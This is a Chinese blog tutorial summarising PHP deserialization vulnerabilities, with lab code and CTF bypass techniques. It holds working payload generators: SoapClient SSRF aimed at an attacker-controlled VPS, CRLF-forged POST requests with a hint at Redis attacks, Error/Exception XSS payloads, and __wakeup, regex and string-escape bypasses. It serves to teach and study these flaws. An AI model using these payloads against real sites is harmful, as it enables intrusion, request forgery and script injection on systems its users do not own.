{"blogid": "125239870", "writerAge": "码龄9年", "writerBlogNum": "9", "writerCollect": "45", "writerComment": "15", "writerFan": "101", "writerGrade": "2级", "writerIntegral": "148", "writerName": "black guest丶", "writerProfileAdress": "writer_image\\profile_125239870.jpg", "writerRankTotal": "95152", "writerRankWeekly": "35347", "writerThumb": "23", "writerVisitNum": "8021", "blog_read_count": "1121", "blog_time": "于 2022-06-11 22:47:47 发布", "blog_title": "PHP反序列化漏洞总结", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<h1><a id=\"PHP_0\"></a>PHP反序列化漏洞总结</h1>\n<h2><a id=\"_2\"></a>原理</h2>\n<p>​ 编程语言提供了一种序列化机制，可以将内存中的对象转为字符串，这样就可以将对象进行存储等操作，而反序列化就是把这个字符串还原成内存中的对象。当进行反序列化的时候这个字符串可控，并且又没有进行过滤，那么就可能存在反序列化漏洞。</p>\n<p>​ 为什么字符串可控且没有过滤会存在漏洞呢？先来看看序列化和反序列化的过程：</p>\n<p>PHP代码：</p>\n<pre><code>&lt;?php\nclass Test {\n\tpublic $name = 'dyb';\n\tpublic function __construct() {\n\t\techo 'construct Called&lt;br /&gt;';\n\t}\n\tpublic function __destruct() {\n\t\techo 'destruct Called&lt;br /&gt;';\n\t}\n\tpublic function __sleep() {\n\t\techo 'sleep Called&lt;br /&gt;';\n\t\treturn array('name');\n\t}\n\tpublic function __wakeup() {\n\t\techo 'wakeup Called&lt;br /&gt;';\n\t}\n}\n\n\n$obj = new Test();\necho \"before searialized&lt;br /&gt;\";\n$searialized = serialize($obj);\necho \"searialized string: \".$searialized.\"&lt;br /&gt;\";\nunserialize($searialized);\necho \"after unserialize&lt;br /&gt;\";\n\n?&gt;\n</code></pre>\n<p>​ 这串代码很简单，实例化一个名为Test的类对象-&gt;serialize函数把这个对象序列化成一个字符串打印出来-&gt;反序列化这个字符串，看看运行的结果：</p>\n<p><img alt=\"image-20220409230518433\" src=\"image\\5b6ee0e3a5f0930e97753cd8a24cb551.png\"/></p>\n<p><strong>结果：</strong></p>\n<p>​ 1.在实例化一个对象的时候，construct函数被自动调用。</p>\n<p>​ 2.在使用serialize函数将对象序列化成一个字符串的时候，sleep方法被自动调用。</p>\n<p>​ 3.在使用unserialize函数将字符串反序列化的时候，wakeup方法被自动调用。</p>\n<p>​ 4.在本程序快结束的时候，destruct方法被调用了2次。</p>\n<h3><a id=\"_54\"></a>一、魔术方法</h3>\n<p>​ 上面这些被自动调用的方法，PHP里叫做魔术方法，不光PHP有，其他的语言也有，比如在C++里有构造函数和析构函数，对应着PHP的__construct和__destruct。除了这里写的魔术方法，PHP还有其他魔术方法，会在某些特定情况下被自动调用，下面列举一些常见的魔术方法和它的作用：</p>\n<p>​ <strong>1、构造函数：__construct():</strong></p>\n<p>​ 对象被实例化的时候，自动调用。</p>\n<p>​ <strong>2、析构函数：__destruct():</strong></p>\n<p>​ 对象被销毁前自动调用。</p>\n<p>​ 3、 __set(<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\">\n    \n     \n      \n       \n        k\n       \n       \n        e\n       \n       \n        y\n       \n       \n        ,\n       \n      \n      \n       key,\n      \n     \n    </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.88888em; vertical-align: -0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.03148em;\">k</span><span class=\"mord mathdefault\">e</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">y</span><span class=\"mpunct\">,</span></span></span></span></span>value):</p>\n<p>​ 给类的私有属性赋值时自动调用。</p>\n<p>​ 4、 __get($key):</p>\n<p>​ 获取类的私有属性时自动调用。</p>\n<p>​ 5、 __isset($key):</p>\n<p>​ 外部使用isset()函数检测这个类的私有属性时，自动调用。</p>\n<p>​ 6、 __unset($key):</p>\n<p>​ 外部使用unset()函数删除这个类的私有属性时，自动调用。</p>\n<p>​ 7、__clone:</p>\n<p>​ 当使用clone关键字，克隆对象时，自动调用。</p>\n<p>​ <strong>8、__tostring():</strong></p>\n<p>​ 当使用echo等输出语句，直接打印对象时自动调用，例如上面那个代码中的echo $searialized其实就会调用这个魔术方法。</p>\n<p>​ <strong>9、__call():</strong></p>\n<p>​ 调用类中未定义或未公开的方法时，自动调用。</p>\n<p>​ 10、__autoload()</p>\n<p>​ ① 这是唯一一个不在类中使用的魔术方法。</p>\n<p>​ ② 当实例化一个不存在的类时，自动调用这个魔术方法。</p>\n<p>​ ③ 调用时，会自动给__autoload()传递一个参数：实例化的类名</p>\n<p>​ <strong>11、__sleep()：</strong></p>\n<p>​ 把对象实例化成字符串的时候自动调用（上面的示例中有）</p>\n<p>​ <strong>12、__wakeup():</strong></p>\n<p>​ 把字符串反序列化成对象时，会优先调用自动调用。</p>\n<h3><a id=\"_110\"></a>二、序列化和反序列化过程</h3>\n<p>​ OK，现在已经知道了魔术方法，那么再来仔细看一下序列化的字符串：O:4:“Test”:1:{s:4:“name”;s:3:“dyb”;}</p>\n<p><img alt=\"image-20220409202046688\" src=\"image\\0c82e01fb6d74977799d824ac58175fa.png\"/></p>\n<p>​ 这个字符串是这样翻译的：</p>\n<p><img alt=\"image-20220412164252822\" src=\"image\\5ef73629f46cc6f61543deb91bf8ec30.png\"/></p>\n<p>​ 再和这个类对象对比一下，可以发现，序列化的时候只是将类的属性转为了字符串，并没有把方法转为字符串。</p>\n<p><img alt=\"image-20220409203502786\" src=\"image\\ab04b8fea7857bfaf609a14ccd8bc0a2.png\"/></p>\n<p>​ 理解了序列化的过程，那么反序列化的过程也比较容易理解了，就是把一个字符串按照它特定的格式解析，还原成类对象，并且只是还原了它的成员属性，没有动它的方法，既然序列化都没有将方法转成字符串，那么反序列化的时候自然是需要代码中有这个类的方法的代码它才能调用，是吧。</p>\n<h3><a id=\"_126\"></a>三、反序列化漏洞</h3>\n<p>​ 那么弄清了上述2点，反序列化漏洞就说得清了：</p>\n<p>​ 1.在反序列化的时候，如果这个字符串可控，我们就可以让它反序列化出代码中任意一个类对象，并且类对象的属性是可控的。</p>\n<p>​ 2.由于存在会自动调用的魔术方法（当然手动调用的方法也一样），如果这些方法中调用了自己的属性值（我们可控），那么我们就可以操控方法调用的结果了。</p>\n<p>​ 3.虽然介绍了魔术方法，但反序列化漏洞和魔术方法没有必然联系，调用普通方法也可能触发反序列化漏洞，只是魔术方法自动调用更容易被编程人员忽视。</p>\n<p>​ 因此，寻找反序列化漏洞的利用链就变成了：</p>\n<p>​ 1.存在的一个类（代码中写/系统自带的）。</p>\n<p>​ 2.类的方法被调用时（自动/手动）如果使用了自己成员属性的值，那么这个方法的执行结果我们就可控。</p>\n<h3><a id=\"_142\"></a>基础实验</h3>\n<p>来试验一下，这是test.php的内容：</p>\n<pre><code>&lt;?php\n\nclass Test {\n\tpublic $name = 'right.php';\n\tpublic function __construct() {\n\t\techo 'construct Called&lt;br /&gt;';\n\t}\n\tpublic function __destruct() {\n\t\tinclude($this-&gt;name);\n\t}\n\tpublic function __sleep() {\n\t\techo 'sleep Called&lt;br /&gt;';\n\t\treturn array('name');\n\t}\n\tpublic function __wakeup() {\n\t\techo 'wakeup Called&lt;br /&gt;';\n\t}\n\n}\n\n\n$obj = new Test();\t\necho \"before searialized&lt;br /&gt;\";\n$searialized = serialize($obj);\necho \"searialized string: \".$searialized.\"&lt;br /&gt;\";\n\necho \"-------------------------------------------------------&lt;br /&gt;\";\n$obj2 = @unserialize($_GET['s']);\nif($obj2)\n\techo \"after unserialize &lt;br /&gt;\";\n\n?&gt;\n</code></pre>\n<p>right.php</p>\n<pre><code>&lt;?php\necho \"right&lt;br/&gt;\";\n</code></pre>\n<p>flag.php</p>\n<pre><code>&lt;?php\necho \"flag here&lt;br/&gt;\";\n</code></pre>\n<p>这一次__destruct方法中的内容变为了include $name的值，正常情况会包含right.php文件的内容，程序把创建的Test对象序列化成字符串后发送到前端，再通过GET方式接收一个字符串进行反序列化。</p>\n<p><img alt=\"image-20220410114619595\" src=\"image\\89b553fbe65c0e140e46e6be3f2aa00a.png\"/></p>\n<p>由于GET方式接收的变量可控，所以我们可以直接修改$name的值，这样就能让它包含别的文件，这就是反序列化漏洞：</p>\n<p><img alt=\"image-20220410114853642\" src=\"image\\5c59f8e6469385e6633e9c14bf3cfb46.png\"/></p>\n<p>注意结尾输出了flag here和right，这说明有2个Test对象，一个是new创建的，一个是反序列化生成的对象。</p>\n<h2><a id=\"_205\"></a>反序列化漏洞利用方法</h2>\n<h3><a id=\"_207\"></a>一、利用代码中存在的类</h3>\n<p>​ 由于反序列化漏洞中类对象的属性都是可控的，所以只要魔术方法或普通方法调用了类的属性就可能有利用点，这也是常见的利用姿势。</p>\n<h3><a id=\"_211\"></a>二、利用原生类/内置类</h3>\n<p>​ 除了自己编写在代码中的类，还有一些PHP自带的类，也一样可以利用，实战中可以用来盲打PHP反序列化。</p>\n<h4><a id=\"_215\"></a>打印原生类</h4>\n<pre><code>&lt;?php\n$classes = get_declared_classes();\nforeach ($classes as $class) {\n   $methods = get_class_methods($class);\n   foreach ($methods as $method) {\n       if (in_array($method, array(\n           '__destruct',\n           '__toString',\n           '__wakeup',\n           '__call',\n           '__callStatic',\n           '__get',\n           '__set',\n           '__isset',\n           '__unset',\n           '__invoke',\n           '__set_state'\n       ))) {\n           print $class . '::' . $method . \"\\n\";\n       }\n   }\n}\n</code></pre>\n<h4><a id=\"SoapClient_SSRF_244\"></a>利用SoapClient 进行SSRF攻击</h4>\n<p>​ 格式：在实例化对象的时候需要传入2个参数：public SoapClient::__construct(?string <code>$wsdl</code>, array <code>$options</code> = [])</p>\n<p>​ SoapClient 用作SOAP协议，它实现了__CALL方法，在调用一个不存在的方法时会触发CALL方法，可以造成SSRF攻击。不过我没有找到CALL方法的原型，不清楚它具体是如何实现的。</p>\n<h5><a id=\"_250\"></a>利用条件</h5>\n<p>​ (PHP 5, PHP 7, PHP 8)</p>\n<p>​ 1.目标服务器启用了php_soap扩展。</p>\n<p>​ 2.反序列化后调用了SoapClient中不存在的方法，导致__CALL被调用。</p>\n<h5><a id=\"_258\"></a>实验</h5>\n<p>​ 开启php_soap.dll扩展：</p>\n<p><img alt=\"image-20220410150803120\" src=\"image\\28d238e1109aa96c29c699a687f32311.png\"/></p>\n<p>​ test.php:</p>\n<pre><code>&lt;?php\n\nhighlight_file(__FILE__);\n\n\n$vip = unserialize($_GET['vip']);\n//vip can get flag one key\n$vip-&gt;getFlag();\n</code></pre>\n<p>​ 这道题没有提供任何类的代码，所以只能用内置已经存在的类进行反序列化攻击，生成payload（web访问这个页面来生成）:</p>\n<pre><code>&lt;?php\n$a = new SoapClient(null, array('uri' =&gt; 'test', 'location' =&gt; 'http://192.168.160.202:8888/path'));  //修改这里的地址为自己的vps\n$b = serialize($a);\necho $b;\n</code></pre>\n<p>​ 结果：</p>\n<pre><code>O:10:\"SoapClient\":3:{s:3:\"uri\";s:4:\"test\";s:8:\"location\";s:32:\"http://192.168.160.202:8888/path\";s:13:\"_soap_version\";i:1;}\n</code></pre>\n<p>​ 发送payload后，自己的vps上收到了GET请求。</p>\n<p><img alt=\"image-20220411152012814\" src=\"image\\cd5835c184d61fd245a914f24b4e7b1d.png\"/></p>\n<h5><a id=\"CRLF_296\"></a>结合CRLF</h5>\n<p>​ new SoapClient的时候，options参数中还有一个选项为<code>user_agent</code>，允许我们自己设置<code>User-Agent</code>的值，当我们可以控制<code>User-Agent</code>的值时，也就意味着我们完全可以构造一个POST请求，因为<code>Content-Type</code>为和<code>Content-Length</code>都在<code>User-Agent</code>之下，而控制这两个是利用CRLF发送post请求最关键的地方。</p>\n<p>​ 生成payload（web访问这个页面来生成）：</p>\n<pre><code>&lt;?php\n$target = 'http://192.168.160.202:8888/bbb.php';\t    //target\n\n$post_string = 'a=b&amp;flag=aaa';\t\t\t\t  //这里就可以放入通过CRLF攻击redis的payload\n\n$headers = array(\n    'X-Forwarded-For: 127.0.0.1',\t\t\t  \n    'Cookie: xxxx=1234'\n    );\n    \n$b = new SoapClient(null,array('location' =&gt; $target,'user_agent'=&gt;'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      =&gt; \"aaab\"));\n\n$aaa = serialize($b);\n$aaa = str_replace('^^','%0d%0a',$aaa);\t\t   //这里把前面的^^替换成了CRLF\n$aaa = str_replace('&amp;','%26',$aaa);            //编码&amp;，&amp;是参数分隔符，不编码会分割参数。\necho $aaa;\t\t\t\t\t\t\t\t\n?&gt;\n\n</code></pre>\n<p>​ 发送payload：</p>\n<p><img alt=\"image-20220411153449658\" src=\"image\\b20e34f2f194f2887f3cff9e03a45e30.png\"/></p>\n<h4><a id=\"ErrorXSS_329\"></a>利用Error进行XSS攻击</h4>\n<p>Error方法中实现了__toString，被调用时会返回 Error 的 string表达形式，可能造成XSS。</p>\n<h5><a id=\"_333\"></a>利用条件</h5>\n<p>(PHP 7, PHP 8)</p>\n<p>​ 1.打印对象，导致__toString方法被调用。</p>\n<h5><a id=\"_339\"></a>实验</h5>\n<p>test.php</p>\n<pre><code>&lt;?php\nhighlight_file(__FILE__);\n// error_reporting(0);\n$a = $_GET['vip'];\necho unserialize($a);\n?&gt;\n</code></pre>\n<p>生成payload</p>\n<pre><code>&lt;?php\n$a = new Error(\"&lt;script&gt;alert(1)&lt;/script&gt;\");\necho urlencode(serialize($a));\n?&gt;\n</code></pre>\n<p>发送payload</p>\n<h5><a id=\"image20220411161744321httpsimgblogcsdnimgcnimg_convert328a1a2b606ccedac3e1ca2f21e8dc0dpng_363\"></a><img alt=\"image-20220411161744321\" src=\"image\\328a1a2b606ccedac3e1ca2f21e8dc0d.png\"/></h5>\n<h4><a id=\"ExceptionXSS_365\"></a>利用Exception进行XSS攻击</h4>\n<p>​ Exception继承了Error，和Error的利用方式一样。</p>\n<h5><a id=\"_369\"></a>利用条件</h5>\n<p>(PHP 5, PHP 7, PHP 8)</p>\n<p>1.打印对象，导致__toString方法被调用。</p>\n<h5><a id=\"_375\"></a>实验</h5>\n<p>test.php</p>\n<pre><code>&lt;?php\nhighlight_file(__FILE__);\n// error_reporting(0);\n$a = $_GET['vip'];\necho unserialize($a);\n?&gt;\n</code></pre>\n<p>生成payload：</p>\n<pre><code>&lt;?php\n$a = new Exception(\"&lt;script&gt;alert(1)&lt;/script&gt;\");\necho urlencode(serialize($a));\n?&gt;\n</code></pre>\n<p><img alt=\"image-20220411164108351\" src=\"image\\4ba5ed9035eb0e0e3ccb907fe4e0fa1f.png\"/></p>\n<h4><a id=\"_401\"></a>更多原生类的用法</h4>\n<p>想要了解更多php原生类的用法可以看这个文章，有些类是不能进行序列化的，所以没有放到这篇文章。https://www.codetd.com/article/13648456#_SimpleXMLElement__XXE_603</p>\n<h1><a id=\"CTF_405\"></a>CTF中常见绕过方法</h1>\n<h2><a id=\"wakeup_407\"></a>一、绕过wakeup</h2>\n<p><code>unserialize()</code> 反序列化时会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup</code> 方法，预先准备对象需要的资源，如重建数据库连接、初始化成员变量等，重新初始化成员变量也可以缓解反序列化漏洞造成的影响，但某些版本可被绕过。</p>\n<p>​ 影响版本为：PHP 5至5.6.25，PHP 7至 7.0.10。</p>\n<h3><a id=\"_413\"></a>原理</h3>\n<p>​ 当序列化后的字符串中定义的变量数大于实际变量数量时，就会绕过 wakeup()函数，如：O:4:“xctf”:2:{s:4:“flag”;s:4:“flag”;}，xctf\":2 指2个参数，实际上只有flag=flag一个变量。</p>\n<h3><a id=\"_417\"></a>实验</h3>\n<p>test.php</p>\n<pre><code>&lt;?php\n\nclass Test {\n\tpublic $name = 'right.php';\n\tpublic function __construct() {\n\t\techo 'construct Called&lt;br /&gt;';\n\t}\n\tpublic function __destruct() {\n\t\techo '__destruct Called&lt;br /&gt;';\n\t}\n\tpublic function __sleep() {\n\t\techo 'sleep Called&lt;br /&gt;';\n\t\treturn array('name');\n\t}\n\tpublic function __wakeup() {\n\t\techo 'wakeup Called&lt;br /&gt;';\n\t}\n\n}\n\n\n$obj = new Test();\t\necho \"before searialized&lt;br /&gt;\";\n$searialized = serialize($obj);\necho \"searialized string: \".$searialized.\"&lt;br /&gt;\";\n\necho \"-------------------------------------------------------&lt;br /&gt;\";\n$obj2 = @unserialize($_GET['s']);\nif($obj2)\n\techo \"after unserialize &lt;br /&gt;\";\n\nvar_dump($obj2);\necho \"&lt;br /&gt;\";\n?&gt;\n</code></pre>\n<p>输入正常的序列化字符串进行反序列化：</p>\n<p><img alt=\"image-20220428175741687\" src=\"image\\1bf9e26e32e39645a276eb16184e0130.png\"/></p>\n<p>修改数量：</p>\n<p><img alt=\"image-20220428175819944\" src=\"image\\726954dbaf403f93228b6c542106f3c3.png\"/></p>\n<p>通过后面的vardump打印对象可以看出，修改数量后反序列化失败了，wakeup也没有执行，但destruct却执行了，所以这个利用链应该只能是destruct魔术方法。</p>\n<h2><a id=\"_468\"></a>二、正则匹配防御及绕过</h2>\n<h3><a id=\"_470\"></a>原理</h3>\n<p>​ 正则：preg_match(‘/[oc]:\\d+:/i’, $var) 匹配反序列化字符串来进行防御，可在数字前添加+进行绕过。</p>\n<p>​ O:4 == O:+4</p>\n<h3><a id=\"_476\"></a>实验</h3>\n<h2><a id=\"_480\"></a>三、反序列化字符串逃逸</h2>\n<h3><a id=\"_482\"></a>过滤时减少字符串导致吞噬</h3>\n<h4><a id=\"_484\"></a>原理</h4>\n<p>​ 前面讲了反序列化时会按照一定格式来解析字符串，读取字符串的时候会按照字符长度从引号中读取指定长度，如果在过滤处理字符串的时候将字符串减少，也可以利用反序列化的解析规则来绕过。</p>\n<p><img alt=\"image-20220412141849043\" src=\"image\\9cd45329269d7211eb5c99faf04d68a1.png\"/></p>\n<h4><a id=\"_490\"></a>实验</h4>\n<p>​ 先来看看这个示例：</p>\n<p>​ 通过get方式接收到字符s后，使用了filter函数进行过滤，过滤的时候把.号过滤掉了。</p>\n<pre><code>&lt;?php\nheader(\"Content-type:text/html;charset=utf-8\");\nfunction filter($str) {\n\treturn str_replace('.', '', $str);\n}\nclass A {\n\tpublic $name = 'name';\n\tpublic $pass = '123456';\n}\n\n$s = $_GET['s'];\necho \"过滤前:\" . $s . \"&lt;br/&gt;\";\n$s = filter($s);\necho \"过滤后:\" . $s . \"&lt;br/&gt;\";\n\nvar_dump(unserialize($s));\n</code></pre>\n<p>​ 输入：O:1:“A”:2:{s:4:“name”;s:7:“xxx.php”;s:4:“pass”;s:6:“123456”;}</p>\n<p>​ 字符串.被过滤，结构被破坏，反序列化失败，原因是解析到s:7:的时候会往后读取7个字符，但是现在读取完第7个后不再是双引号，导致出错：</p>\n<p><img alt=\"image-20220412140832062\" src=\"image\\44ce175b9548d32fc6ccadf027f7fc98.png\"/></p>\n<p>​ 但如果我们能让第七个字符后面还是双引号，那么就可以正常解析后面的内容了，所以我在payload中添加了一个双引号，这样即便被过滤掉一个字符，后续还是可以被正常解析。</p>\n<p>​ 输入：O:1:“A”:2:{s:4:“name”;s:7:“xxx.php”\";s:4:“pass”;s:6:“123456”;}</p>\n<p>​ <img alt=\"image-20220412141641712\" src=\"image\\eef5ea2c7f4b9ed8ce0e4c62b107e28f.png\"/></p>\n<p>​ 利用反序列化解析的规则，后续部分的内容只要符合它的解析规则就可以正常反序列化。这个看实验其实比较好理解：</p>\n<p>​ 输入：O:1:“A”:2:{s:4:“name”;s:6:“xxxxxx…”;s:4:“pass”;s:4:“hack”;}</p>\n<p><img alt=\"image-20220412142747534\" src=\"image\\aadb0bc5597e1a054205f9a98d390d1a.png\"/></p>\n<h3><a id=\"_535\"></a>过滤是增加字符串导致溢出</h3>\n<h4><a id=\"_537\"></a>原理</h4>\n<p>​ 原理和字符串减少的时候差不多。只是构造payload的时候要逆转思维。</p>\n<h4><a id=\"_541\"></a>实验</h4>\n<p>还是上面那个实验环境，输入：O:1:“A”:2:{s:4:“name”;s:4:“xxx.”;s:4:“pass”;s:6:“123456”;}，读取4个字符后面变成了-没法正确闭合：</p>\n<p><img alt=\"image-20220412151508289\" src=\"image\\8225ffddac8a8203818dcdbecbb97f72.png\"/></p>\n<p>​ 那么如果能把xxx-后面的内容变成\";s:4:“pass”;s:4:“hack”;}，拼接出来就是O:1:“A”:2:{s:4:“name”;s:4:“xxx-”;s:4:“pass”;s:4:“hack”;}-\";s:4:“pass”;s:6:“123456”;}，能够正确闭合。</p>\n<p>​ 这里要构造payload就需要逆转一下思维，先让原始payload的name包含\";s:4:“pass”;s:4:“hack”;}，经过filter后产生溢出后刚好让name的值覆盖到双引号前，所以要让溢出的长度=\";s:4:“pass”;s:4:“hack”;}的长度：</p>\n<p>​ 生成payload:</p>\n<pre><code>&lt;?php\nfunction filter($str) {\n\treturn str_replace('.', '', $str);\n}\nclass A {\n\tpublic $name = 'xxx';\n\tpublic $pass = '123456';\n}\n\n$ss = '\";s:4:\"pass\";s:4:\"hack\";}'; \t    //闭合序列化用到的字符串， $pass的值改为了hack。\n$AA = new A();\n$AA-&gt;name = str_repeat('.', 25) . $ss;  //闭合使用的字符串长度为25，一个.号溢出一个，所以需要25个.\necho serialize($AA);\n</code></pre>\n<p><img alt=\"image-20220412162728085\" src=\"image\\5a124493f48662964f9f060d7d7d254a.png\"/></p>\n<h2><a id=\"privateprotected_573\"></a>四、private和protected绕过</h2>\n<h3><a id=\"_575\"></a>原理</h3>\n<p>​ private属性序列化后字段名前会加上\\0前缀（即%00)，长度为1</p>\n<p>​ protected属性序列化后字段名前会加上\\0*\\0，长度为3</p>\n<p>​ 对比结果如图所示：</p>\n<p><img alt=\"image-20210627000752010\" src=\"image\\3ab5e68f0d56caadd0b1368e8fcad39f.png\"/></p>\n<p>​ 通过浏览器发送的话会被转义导致无法反序列化。</p>\n<h3><a id=\"_587\"></a>解决方法</h3>\n<p>构造序列化字符串的时候：</p>\n<p>​ 1.部分版本对关键字不敏感（网传7.1+，但我测试很多版本都这样），可以直接修改为public。</p>\n<p>​ 2.直接浏览器或发送/工具编码可能出问题，可使用php自带的base64进行编码，使用python的requests[可base64]发送。</p>\n<p>base64编码序列化出来的字符串：</p>\n<p><img alt=\"image-20220607132936018\" src=\"image\\aaf4d42a06205fa20c975a42a46084aa.png\"/></p>\n<p>python解码后发送：</p>\n<p><img alt=\"image-20220607132947809\" src=\"image\\337c22bfe34c76247e39d8762a0ddfef.png\"/></p>\n<p><img alt=\"image-20220607132613154\" src=\"image\\6b6cf5fb0e4a653e4b9dc04434889c4a.png\"/></p>\n<h2><a id=\"_605\"></a>五、十六进制绕过</h2>\n<h3><a id=\"_607\"></a>原理</h3>\n<p>​ 序列化字符串中小写的s表示后面内容是字符串，大写S表示十六进制。</p>\n<p>​ 影响范围：PHP5、PHP7</p>\n<h3><a id=\"_613\"></a>实验</h3>\n<pre><code>&lt;?php\n\nclass Test {\n\n\tprotected $name = 'right.php';\n\tpublic function __construct() {\n\t\techo 'construct Called&lt;br /&gt;';\n\t}\n\tpublic function __destruct() {\n\t\techo $this-&gt;name.\"&lt;br /&gt;\";\n\t}\n\tpublic function __sleep() {\n\t\techo 'sleep Called&lt;br /&gt;';\n\t\treturn array('name');\n\t}\n\tpublic function __wakeup() {\n\t\techo 'wakeup Called&lt;br /&gt;';\n\t}\n\n}\n\n\n$obj = new Test();\t\necho \"before searialized&lt;br /&gt;\";\n$searialized = serialize($obj);\necho \"searialized string: \".$searialized.\"&lt;br /&gt;\";\n\n\necho \"-------------------------------------------------------&lt;br /&gt;\";\n$obj2 = @unserialize($_GET['s']);\necho \"after unserialize &lt;br /&gt;\";\n\necho \"&lt;br /&gt;\";\n\n\n\n?&gt;\n</code></pre>\n<p>使用大写S后，可以将字符串十六进制编码。</p>\n<p><img alt=\"image-20220607133553481\" src=\"image\\18d9beaaecb8064441227ccc4cba55b1.png\"/></p>\n<h1><a id=\"_659\"></a>测试方法</h1>\n<p>反序列化漏洞通常出现在cookie等处。</p>\n<p>​ 1.通过代码审计，寻找序列化serialize和反序列化函数unserialize，分析魔术方法和普通方法调用时是否存在利用链。</p>\n<p>​ 2.黑盒测试：黑盒盲测时观察web前端出现的序列化字符串，形式O:1:xxx之类的，前端出现序列化字符串，有序列化必定就有反序列化操作，盲测时可以借助前面讲得原生类进行盲打，也可以根据序列化字符串分析类的结构，猜测其他的类等。</p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}